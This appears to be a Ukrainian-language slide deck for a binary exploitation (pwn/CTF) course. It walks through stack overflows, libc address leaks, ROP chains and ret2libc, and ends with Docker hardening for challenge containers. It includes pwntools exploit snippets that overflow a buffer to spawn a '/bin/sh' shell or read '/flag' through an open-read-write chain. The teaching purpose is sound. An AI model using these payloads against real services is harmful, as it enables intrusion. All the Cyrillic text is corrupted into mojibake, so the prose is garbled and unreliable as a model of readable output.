// –ß–µ–∫–∞—î–º–æ –≤–≤–æ–¥—É...
```

**–ö–æ—Ä–∏—Å—Ç—É–≤–∞—á –≤—ñ–¥–ø—Ä–∞–≤–ª—è—î:** 80 –±–∞–π—Ç
- 72 –±–∞–π—Ç–∏ 'A'
- 8 –±–∞–π—Ç –∞–¥—Ä–µ—Å–∞ win()

---

# Stage 06: Frame 4 - OVERFLOW!

–°—Ç–µ–∫ –ø—ñ—Å–ª—è read()

```
Stack:
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ'AAAAAAAA'‚îÇ ‚Üê buf[0..63]
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ'AAAAAAAA'‚îÇ ‚Üê saved RBP –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞–Ω–∏–π!
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ 0x401136 ‚îÇ ‚Üê saved RIP = win()!
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

**–ü–µ—Ä–µ–∑–∞–ø–∏—Å–∞–Ω–æ**: RIP —Ç–µ–ø–µ—Ä –≤–∫–∞–∑—É—î –Ω–∞ win()

---

# Stage 06: Frame 5 - Return

vuln() –ø–æ–≤–µ—Ä—Ç–∞—î—Ç—å—Å—è

```asm
leave    # rsp = rbp; pop rbp
         # rbp = 'AAAAAAAA' (–Ω–µ –≤–∞–∂–ª–∏–≤–æ)
ret      # pop rip; jmp rip
         # rip = 0x401136
         # –°—Ç—Ä–∏–±–æ–∫ –¥–æ win()!
```

---

# Stage 06: Frame 6 - SUCCESS

win() –≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è

```c
void win() {
    printf("FLAG{...}\n");  // ‚Üê –í–∏–∫–æ–Ω—É—î—Ç—å—Å—è!
}
```

**üéâ –ï–∫—Å–ø–ª–æ–π—Ç —É—Å–ø—ñ—à–Ω–∏–π!**

---

# Stage 06: –ù–µ–±–µ–∑–ø–µ—á–Ω—ñ —Ñ—É–Ω–∫—Ü—ñ—ó

Vulnerable functions

**–î—É–∂–µ –Ω–µ–±–µ–∑–ø–µ—á–Ω—ñ:**
- `gets()` - –Ω–µ–º–∞—î –æ–±–º–µ–∂–µ–Ω–Ω—è
- `scanf("%s")` - –Ω–µ–º–∞—î –æ–±–º–µ–∂–µ–Ω–Ω—è
- `strcpy()` - –Ω–µ –ø–µ—Ä–µ–≤—ñ—Ä—è—î —Ä–æ–∑–º—ñ—Ä
- `strcat()` - –º–æ–∂–µ –ø–µ—Ä–µ–ø–æ–≤–Ω–∏—Ç–∏

**–ë–µ–∑–ø–µ—á–Ω—ñ –∞–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–∏:**
- `fgets(buf, size, stdin)`
- `snprintf(buf, size, ...)`
- `strncpy(dst, src, size)`

---

# Stage 06: Real CVE

–†–µ–∞–ª—å–Ω—ñ –ø—Ä–∏–∫–ª–∞–¥–∏

**CVE-2014-0160 (Heartbleed):**
- Buffer over-read –≤ OpenSSL
- –í–∏—Ç—ñ–∫ –ø–∞–º'—è—Ç—ñ —á–µ—Ä–µ–∑ TLS heartbeat
- 17% —Å–µ—Ä–≤–µ—Ä—ñ–≤ —Å–≤—ñ—Ç—É –≤—Ä–∞–∑–ª–∏–≤—ñ

**CVE-2020-1350 (SIGRed):**
- Buffer overflow –≤ Windows DNS
- Wormable (—Å–∞–º–æ—Ä–æ–∑–ø–æ–≤—Å—é–¥–∂—É–≤–∞–Ω–∏–π)
- CVSS 10.0 (–º–∞–∫—Å–∏–º–∞–ª—å–Ω–∞ –∑–∞–≥—Ä–æ–∑–∞)

---

# Stage 07: –©–æ —Ç–∞–∫–µ ASLR?

Address Space Layout Randomization

````md magic-move
```
–ë–µ–∑ ASLR:
./binary ‚Üí puts @ 0x7ffff7a62aa0
./binary ‚Üí puts @ 0x7ffff7a62aa0 (same!)
```

```
–ó ASLR:
./binary ‚Üí puts @ 0x7f1234567aa0
./binary ‚Üí puts @ 0x7f9876543aa0 (—Ä—ñ–∑–Ω—ñ!)
```
````

**–ü—Ä–æ–±–ª–µ–º–∞**: –ù–µ –º–æ–∂–Ω–∞ hardcode –∞–¥—Ä–µ—Å–∏

---

# Stage 07: –†—ñ—à–µ–Ω–Ω—è - Leak

3-–∫—Ä–æ–∫–æ–≤–∞ —Å—Ç—Ä–∞—Ç–µ–≥—ñ—è

**1. LEAK** ‚Üí –í–∏—Ç—è–≥—É—î–º–æ –∞–¥—Ä–µ—Å—É –∑ –ø—Ä–æ—Ü–µ—Å—É

**2. CALCULATE** ‚Üí –†–æ–∑—Ä–∞—Ö–æ–≤—É—î–º–æ –±–∞–∑—É libc

**3. EXPLOIT** ‚Üí –ë—É–¥—É—î–º–æ payload –∑ –ø—Ä–∞–≤–∏–ª—å–Ω–∏–º–∏ –∞–¥—Ä–µ—Å–∞–º–∏

---

# Stage 07: –ê–Ω–∞—Ç–æ–º—ñ—è libc - FILE

libc.so.6 –Ω–∞ –¥–∏—Å–∫—É

```
libc.so.6 (—Ñ–∞–π–ª):
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê 0x00000
‚îÇ ELF Header     ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§ 0x29d90
‚îÇ puts()         ‚îÇ ‚Üê –§—ñ–∫—Å–æ–≤–∞–Ω–∏–π offset
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§ 0x50d70
‚îÇ system()       ‚îÇ ‚Üê –§—ñ–∫—Å–æ–≤–∞–Ω–∏–π offset
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ ...            ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

**–û—Ñ—Å–µ—Ç–∏ –∑–∞–≤–∂–¥–∏ –æ–¥–Ω–∞–∫–æ–≤—ñ** —É —Ñ–∞–π–ª—ñ

---

# Stage 07: –ê–Ω–∞—Ç–æ–º—ñ—è libc - MEMORY Run 1

–ó–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è —É –ø–∞–º'—è—Ç—å (–ø–µ—Ä—à–∏–π –∑–∞–ø—É—Å–∫)

```
Memory (Run 1):
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê 0x7f1234500000 ‚Üê base (random!)
‚îÇ ELF Header     ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§ 0x7f1234529d90
‚îÇ puts()         ‚îÇ ‚Üê base + 0x29d90
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§ 0x7f1234550d70
‚îÇ system()       ‚îÇ ‚Üê base + 0x50d70
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

**–ë–∞–∑–∞ –≤–∏–ø–∞–¥–∫–æ–≤–∞, –∞–ª–µ –æ—Ñ—Å–µ—Ç–∏ +–æ–¥–Ω–∞–∫–æ–≤—ñ**

---

# Stage 07: –ê–Ω–∞—Ç–æ–º—ñ—è libc - MEMORY Run 2

–ó–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è —É –ø–∞–º'—è—Ç—å (–¥—Ä—É–≥–∏–π –∑–∞–ø—É—Å–∫)

```
Memory (Run 2):
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê 0x7f9876a00000 ‚Üê —ñ–Ω—à–∞ –±–∞–∑–∞!
‚îÇ ELF Header     ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§ 0x7f9876a29d90
‚îÇ puts()         ‚îÇ ‚Üê base + 0x29d90 (—Ç–æ–π –∂–µ +offset!)
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§ 0x7f9876a50d70
‚îÇ system()       ‚îÇ ‚Üê base + 0x50d70 (—Ç–æ–π –∂–µ +offset!)
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

**–ö–ª—é—á**: –û—Ñ—Å–µ—Ç–∏ —Ñ—ñ–∫—Å–æ–≤–∞–Ω—ñ, –±–∞–∑–∞ –∑–º—ñ–Ω—é—î—Ç—å—Å—è

---

# Stage 07: –ú–∞—Ç–µ–º–∞—Ç–∏–∫–∞ leak

–û–±—á–∏—Å–ª–µ–Ω–Ω—è –±–∞–∑–∏ libc

````md magic-move
```python
# –î–∞–Ω–æ:
leaked_puts = 0x7f1234529d90  # –ó LEAK –∫–æ–º–∞–Ω–¥–∏
offset_puts = 0x29d90          # –ó libc.so.6
```

```python
# –§–æ—Ä–º—É–ª–∞:
# leaked_addr = base + offset
# –û—Ç–∂–µ:
base = leaked_puts - offset_puts
base = 0x7f1234529d90 - 0x29d90
base = 0x7f1234500000
```

```python
# –ü–µ—Ä–µ–≤—ñ—Ä–∫–∞: –±–∞–∑–∞ –º–∞—î –∑–∞–∫—ñ–Ω—á—É–≤–∞—Ç–∏—Å—å –Ω–∞ 000
if base & 0xfff != 0:
    print("ERROR: Invalid base!")
```
````

---

# Stage 07: –ó–Ω–∞—Ö–æ–¥–∂–µ–Ω–Ω—è offset - pwntools

–ù–∞–π–ø—Ä–æ—Å—Ç—ñ—à–∏–π —Å–ø–æ—Å—ñ–±

```python
from pwn import *

libc = ELF('libc.so.6', checksec=False)

# –û—Ç—Ä–∏–º–∞—Ç–∏ offset
offset = libc.sym['puts']
print(hex(offset))  # 0x29d90

# –ê–±–æ –¥–ª—è system
system_offset = libc.sym['system']
```

**–†–µ–∫–æ–º–µ–Ω–¥–æ–≤–∞–Ω–æ**: –ó–∞–≤–∂–¥–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ pwntools

---

# Stage 07: –ó–Ω–∞—Ö–æ–¥–∂–µ–Ω–Ω—è offset - readelf

–†—É—á–Ω–∏–π –º–µ—Ç–æ–¥

```bash
readelf -s libc.so.6 | grep ' puts@@'
# 1353: 0000000000029d90  512 FUNC  GLOBAL DEFAULT  15 puts@@GLIBC_2.2.5
#                 ‚Üë
#            Offset!
```

**–ö–æ–ª–æ–Ω–∫–∞ 2**: Value = offset —Ñ—É–Ω–∫—Ü—ñ—ó

---

# Stage 07: dlsym() –ø–æ—è—Å–Ω–µ–Ω–Ω—è

–ö–æ–º–∞–Ω–¥–∞ LEAK —É —Å–µ—Ä–≤–µ—Ä—ñ

```c
void *handle = dlopen(NULL, RTLD_NOW);
void *puts_addr = dlsym(handle, "puts");
printf("PUTS=%p\n", puts_addr);
```

**–©–æ —Ä–æ–±–∏—Ç—å**: –ü–æ–≤–µ—Ä—Ç–∞—î —Ä–µ–∞–ª—å–Ω—É –∞–¥—Ä–µ—Å—É `puts` —É –ø–∞–º'—è—Ç—ñ

---

# Stage 07: Experiment

–ë–∞–≥–∞—Ç–æ—Ä–∞–∑–æ–≤–∏–π –∑–∞–ø—É—Å–∫

```bash
for i in {1..5}; do
  echo "LEAK" | nc 127.0.0.1 7107
done
```

**–†–µ–∑—É–ª—å—Ç–∞—Ç**: 5 —Ä—ñ–∑–Ω–∏—Ö –∞–¥—Ä–µ—Å (ASLR –ø—Ä–∞—Ü—é—î!)

---

# Stage 07: –í–∞–∂–ª–∏–≤—ñ –Ω—é–∞–Ω—Å–∏

–ö—Ä–∏—Ç–∏—á–Ω—ñ –º–æ–º–µ–Ω—Ç–∏

**1. –í–µ—Ä—Å—ñ—è libc –ö–†–ò–¢–ò–ß–ù–ê!**
- –û—Ñ—Å–µ—Ç–∏ —Ä—ñ–∑–Ω—ñ —É —Ä—ñ–∑–Ω–∏—Ö –≤–µ—Ä—Å—ñ—è—Ö
- –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ libc –∑ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∞

**2. –ê–¥—Ä–µ—Å–∏ –≤–∏—Ä—ñ–≤–Ω—è–Ω—ñ:**
- –ë–∞–∑–∞ –∑–∞–≤–∂–¥–∏ –Ω–∞ –º–µ–∂—ñ —Å—Ç–æ—Ä—ñ–Ω–∫–∏ (4KB)
- –ó–∞–≤–∂–¥–∏ –∑–∞–∫—ñ–Ω—á—É—î—Ç—å—Å—è –Ω–∞ `000`

**3. –û–¥–∏–Ω leak = –≤—Å—è libc:**
- –ó–Ω–∞—é—á–∏ –æ–¥–Ω—É —Ñ—É–Ω–∫—Ü—ñ—é ‚Üí –∑–Ω–∞—î–º–æ –≤—Å—ñ

---

# Stage 08: –©–æ —Ç–∞–∫–µ ret2libc?

–í–∏–∫–ª–∏–∫ —Ñ—É–Ω–∫—Ü—ñ–π –∑ libc

**–ü—Ä–æ–±–ª–µ–º–∞**: NX = On (shellcode –Ω–µ –≤–∏–∫–æ–Ω–∞—î—Ç—å—Å—è)

**–†—ñ—à–µ–Ω–Ω—è**: –í–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏ —ñ—Å–Ω—É—é—á–∏–π –∫–æ–¥ –∑ libc
- `system("/bin/sh")` ‚Üí –∑–∞–ø—É—Å—Ç–∏—Ç–∏ shell
- –ê–±–æ ORW (open-read-write)

---

# Stage 08: –©–æ —Ç–∞–∫–µ ROP?

Return Oriented Programming

**–Ü–¥–µ—è**: –õ–∞–Ω—Ü—é–∂–æ–∫ `ret` —ñ–Ω—Å—Ç—Ä—É–∫—Ü—ñ–π

```asm
gadget1:
    pop rdi
    ret

gadget2:
    pop rsi
    ret
```

**–í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è**: –í—Å—Ç–∞–Ω–æ–≤–∏—Ç–∏ –ø–∞—Ä–∞–º–µ—Ç—Ä–∏ + –≤–∏–∫–ª–∏–∫–∞—Ç–∏ —Ñ—É–Ω–∫—Ü—ñ—é

---

# Stage 08: –©–æ —Ç–∞–∫–µ gadget?

–ú–∞–ª–µ–Ω—å–∫—ñ —à–º–∞—Ç–∫–∏ –∫–æ–¥—É

**Gadget** = —ñ–Ω—Å—Ç—Ä—É–∫—Ü—ñ—è + `ret`

```asm
pop rdi          # –í–∑—è—Ç–∏ –∑—ñ —Å—Ç–µ–∫—É —É rdi
ret              # –ü–µ—Ä–µ–π—Ç–∏ –¥–∞–ª—ñ
```

**–ü–æ—à—É–∫**: `ROPgadget --binary libc.so.6`

---

# Stage 08: ROP chain —Å—Ç—Ä—É–∫—Ç—É—Ä–∞

Stack layout

```
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ 'A' * 72   ‚îÇ ‚Üê –ó–∞–ø–æ–≤–Ω–µ–Ω–Ω—è
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ pop rdi    ‚îÇ ‚Üê Gadget 1
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ "/bin/sh"  ‚îÇ ‚Üê –ê—Ä–≥—É–º–µ–Ω—Ç –¥–ª—è rdi
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ system()   ‚îÇ ‚Üê –ê–¥—Ä–µ—Å–∞ —Ñ—É–Ω–∫—Ü—ñ—ó
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

---

# Stage 08: Frame 0 - ROP START

–ü—ñ—Å–ª—è return –∑ bof()

```
Stack:
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ pop_rdi    ‚îÇ ‚Üê rsp —Ç—É—Ç
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ binsh_addr ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ system_addr‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò

rip = ??? (—â–æ–π–Ω–æ –ø–æ–≤–µ—Ä–Ω—É–ª–∏—Å—è)
```

---

# Stage 08: Frame 1 - Return

`ret` –≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è

```asm
ret  # pop rip; jmp rip
```

```
rip = pop_rdi  ‚Üê –í–∑—è—Ç–æ –∑—ñ —Å—Ç–µ–∫—É
Stack:
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ binsh_addr ‚îÇ ‚Üê rsp —Ç–µ–ø–µ—Ä —Ç—É—Ç
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ system_addr‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

**–°—Ç—Ä–∏–±–æ–∫ –¥–æ gadget!**

---

# Stage 08: Frame 2 - Gadget

`pop rdi; ret` –≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è

```asm
pop rdi  # rdi = binsh_addr
ret      # –ù–∞—Å—Ç—É–ø–Ω–∞ —ñ–Ω—Å—Ç—Ä—É–∫—Ü—ñ—è
```

```
rdi = "/bin/sh" –∞–¥—Ä–µ—Å–∞
Stack:
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ system_addr‚îÇ ‚Üê rsp —Ç—É—Ç
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

---

# Stage 08: Frame 3 - System

–í–∏–∫–ª–∏–∫ system("/bin/sh")

```
rdi = "/bin/sh"
rip = system

system(rdi) ‚Üí system("/bin/sh")
‚Üí Shell –∑–∞–ø—É—Å–∫–∞—î—Ç—å—Å—è!
```

**üéâ ROP —É—Å–ø—ñ—à–Ω–∏–π!**

---

# Stage 08: Calling Convention

–ß–æ–º—É RDI?

```
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ 1-–π ‚îÇ RDI             ‚îÇ
‚îÇ 2-–π ‚îÇ RSI             ‚îÇ
‚îÇ 3-–π ‚îÇ RDX             ‚îÇ
‚îÇ 4-–π ‚îÇ RCX             ‚îÇ
‚îÇ 5-–π ‚îÇ R8              ‚îÇ
‚îÇ 6-–π ‚îÇ R9              ‚îÇ
‚îÇ 7+  ‚îÇ Stack           ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

**–ü—Ä–∏–∫–ª–∞–¥**: `system(cmd)` ‚Üí cmd —É RDI

---

# Stage 08: File Descriptors

–ß–æ–º—É fd=3 –¥–ª—è open()?

```
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ 0  ‚îÇ stdin           ‚îÇ
‚îÇ 1  ‚îÇ stdout          ‚îÇ
‚îÇ 2  ‚îÇ stderr          ‚îÇ
‚îÇ 3  ‚îÇ –ü–µ—Ä—à–∏–π —Ñ–∞–π–ª!    ‚îÇ
‚îÇ 4  ‚îÇ –î—Ä—É–≥–∏–π —Ñ–∞–π–ª     ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

**open()** –ø–æ–≤–µ—Ä—Ç–∞—î –Ω–∞–π–º–µ–Ω—à–∏–π –≤—ñ–ª—å–Ω–∏–π FD = 3

---

# Stage 08: –ï–∫—Å–ø–ª–æ–π—Ç - Variant A

system("/bin/sh")

```python
from pwn import *

# ... leak base ...
rop = ROP(libc)
binsh = next(libc.search(b'/bin/sh\x00'))

rop.system(binsh)
payload = b'A'*72 + rop.chain()
io.send(payload)
io.interactive()
```

---

# Stage 08: –ï–∫—Å–ø–ª–æ–π—Ç - Variant B (ORW)

Open-Read-Write

```python
rop = ROP(libc)

rop.open(next(libc.search(b'/flag\x00')), 0)
rop.read(3, elf.bss(0x200), 0x100)
rop.write(1, elf.bss(0x200), 0x100)

payload = b'A'*72 + rop.chain()
```

**–ü–µ—Ä–µ–≤–∞–≥–∏**: –ü—Ä–∞—Ü—é—î –Ω–∞–≤—ñ—Ç—å –∑ seccomp

---

# Stage 08: –ß–æ–º—É ORW –∫—Ä–∞—â–µ?

–ü–µ—Ä–µ–≤–∞–≥–∏ –Ω–∞–¥ shell

**Seccomp filters:**
- –ú–æ–∂–µ –±–ª–æ–∫—É–≤–∞—Ç–∏ `execve`
- ORW –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î `open/read/write` (–¥–æ–∑–≤–æ–ª–µ–Ω—ñ)

**–ú–µ—Ä–µ–∂–µ–≤—ñ –æ–±–º–µ–∂–µ–Ω–Ω—è:**
- Shell –ø–æ—Ç—Ä–µ–±—É—î TTY
- ORW –ø—Ä–∞—Ü—é—î —á–µ—Ä–µ–∑ –±—É–¥—å-—è–∫–µ –∑'—î–¥–Ω–∞–Ω–Ω—è

**–ù–∞–¥—ñ–π–Ω—ñ—Å—Ç—å**: –ó–∞–≤–∂–¥–∏ –ø—Ä–∞—Ü—é—î —è–∫—â–æ —î –±–∞–∑–æ–≤—ñ syscalls

---

# Docker: –†–∏–∑–∏–∫–∏

–ù–µ–±–µ–∑–ø–µ–∫–∏ –Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω–æ–≥–æ deployment

```yaml
# ‚ùå –ü–û–ì–ê–ù–û
docker run --privileged pwn
docker run -v /:/host pwn
docker run --cap-add=ALL pwn
```

**–ù–∞—Å–ª—ñ–¥–∫–∏:**
- Container escape
- Host compromise
- DoS –∞—Ç–∞–∫–∏

---

# Docker: –ö–æ—Ä–∏—Å—Ç—É–≤–∞—á

–ù–ï –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ root

```yaml
services:
  pwn:
    user: "10001:10001"  # –ù–µ root!
    read_only: true      # –§–∞–π–ª–æ–≤–∞ —Å–∏—Å—Ç–µ–º–∞ read-only
    tmpfs:
      - /tmp:rw,noexec,nosuid
```

---

# Docker: Capabilities

Drop ALL

```yaml
services:
  pwn:
    security_opt:
      - no-new-privileges:true
    cap_drop:
      - ALL
```

**–ú—ñ–Ω—ñ–º–∞–ª—å–Ω—ñ –ø—Ä–∏–≤—ñ–ª–µ—ó**: –¢—ñ–ª—å–∫–∏ –Ω–µ–æ–±—Ö—ñ–¥–Ω—ñ syscalls

---

# Docker: Resource Limits

–û–±–º–µ–∂–µ–Ω–Ω—è —Ä–µ—Å—É—Ä—Å—ñ–≤

```yaml
services:
  pwn:
    mem_limit: 256m
    cpus: 0.5
    pids_limit: 128
    ulimits:
      nproc: 128
      nofile: 1024
```

**–ó–∞—Ö–∏—Å—Ç**: –í—ñ–¥ DoS –∞—Ç–∞–∫

---

# Docker: Seccomp

–§—ñ–ª—å—Ç—Ä–∞—Ü—ñ—è —Å–∏—Å—Ç–µ–º–Ω–∏—Ö –≤–∏–∫–ª–∏–∫—ñ–≤

```json
{
  "defaultAction": "SCMP_ACT_ERRNO",
  "syscalls": [{
    "names": ["read", "write", "exit"],
    "action": "SCMP_ACT_ALLOW"
  }]
}
```

**–ó–∞—Å—Ç–æ—Å—É–≤–∞–Ω–Ω—è**: `seccomp=./seccomp.json`

---

# Docker: Seccomp –¥–ª—è ORW

–î–æ–∑–≤–æ–ª–∏—Ç–∏ open/read/write

```json
{
  "syscalls": [{
    "names": [
      "read", "write", "open", "openat",
      "close", "exit", "exit_group"
    ],
    "action": "SCMP_ACT_ALLOW"
  }]
}
```

---

# Docker: –ú–µ—Ä–µ–∂–µ–≤–∞ —ñ–∑–æ–ª—è—Ü—ñ—è

Internal network

```yaml
networks:
  pwn_internal:
    driver: bridge
    internal: true  # –ë–µ–∑ –Ü–Ω—Ç–µ—Ä–Ω–µ—Ç—É!
```

**–ó–∞—Ö–∏—Å—Ç**: –ö–æ–Ω—Ç–µ–π–Ω–µ—Ä –Ω–µ –º–æ–∂–µ –ø—ñ–¥–∫–ª—é—á–∏—Ç–∏—Å—å –Ω–∞–∑–æ–≤–Ω—ñ

---

# –í–∏—Å–Ω–æ–≤–∫–∏: PWN

–ö–ª—é—á–æ–≤—ñ –ø—Ä–∏–Ω—Ü–∏–ø–∏

- üéØ **–ü—Ä–æ–≥—Ä–µ—Å—ñ—è**: nc ‚Üí checksec ‚Üí BOF ‚Üí ROP ‚Üí ret2libc
- üêç **–ê–≤—Ç–æ–º–∞—Ç–∏–∑–∞—Ü—ñ—è**: pwntools –∫—Ä–∏—Ç–∏—á–Ω–æ –≤–∞–∂–ª–∏–≤–∏–π
- üîí **Docker**: –ü—Ä–∞–≤–∏–ª—å–Ω–∞ —ñ–∑–æ–ª—è—Ü—ñ—è –æ–±–æ–≤'—è–∑–∫–æ–≤–∞
- üìä **–ú–µ—Ç–æ–¥–æ–ª–æ–≥—ñ—è**: –ü–æ–∫–∞–∑—É–≤–∞—Ç–∏ C –∫–æ–¥ + Python exploit
- üõ°Ô∏è **–ë–µ–∑–ø–µ–∫–∞**: Drop caps, read-only FS, seccomp, limits

---
layout: center
class: text-center
---

# –î—è–∫—É—é –∑–∞ —É–≤–∞–≥—É!